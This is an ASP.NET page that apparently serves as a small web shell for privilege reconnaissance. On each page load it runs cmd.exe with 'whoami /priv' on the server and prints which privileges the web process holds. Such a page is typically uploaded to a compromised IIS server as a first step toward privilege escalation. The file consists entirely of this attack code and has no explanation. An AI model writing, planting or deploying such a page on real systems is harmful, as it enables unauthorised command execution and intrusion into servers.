<%@ Page Language="C#" %> 
<!DOCTYPE html> 
<html> 
<head> 
    <title>whoami pe</title> 
</head> 
<body> 
    <h1>whoami</h1> 
    <p> 
        <%  
        System.Diagnostics.Process process = new System.Diagnostics.Process(); 
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); 
        startInfo.FileName = "cmd.exe"; 
        startInfo.Arguments = "/C whoami /priv"; 
        startInfo.RedirectStandardOutput = true; 
        startInfo.UseShellExecute = false; 
        startInfo.CreateNoWindow = true; 
        process.StartInfo = startInfo; 
        process.Start(); 
        string output = process.StandardOutput.ReadToEnd(); 
        process.WaitForExit(); 
        Response.Write(output); 
        %> 
    </p> 
</body> 
</html>
